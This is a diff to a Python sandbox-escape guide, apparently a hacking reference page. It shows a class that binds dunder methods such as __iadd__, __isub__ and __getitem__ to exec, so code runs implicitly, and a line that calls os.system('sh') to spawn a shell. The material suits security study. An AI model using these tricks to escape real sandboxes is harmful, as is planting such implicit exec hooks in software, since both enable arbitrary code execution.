@@ -172,14 +172,18 @@ You can modify some **class methods** (_by overwriting existing class methods or
 # This class has 3 different was to trigger RCE without directly calling any function
 class RCE:
     def __init__(self):
-        self += "print('Hello from __iadd__')"
+        self += "print('Hello from __init__ + __iadd__')"
     __iadd__ = exec #Triggered when object is created
+    def __del__(self):
+        self -= "print('Hello from __del__ + __isub__')"
+    __isub__ = exec #Triggered when object is created
     __getitem__ = exec #Trigerred with obj[<argument>]
     __add__ = exec #Triggered with obj + <argument>
 
-rce = RCE()
+rce = RCE() #Later we will see how to create objects without calling the constructor
 rce["print('Hello from __getitem__')"]
 rce + "print('Hello from __add__')"
+del rce
 
 # Other
 __sub__ (k - 'import os; os.system("sh")')
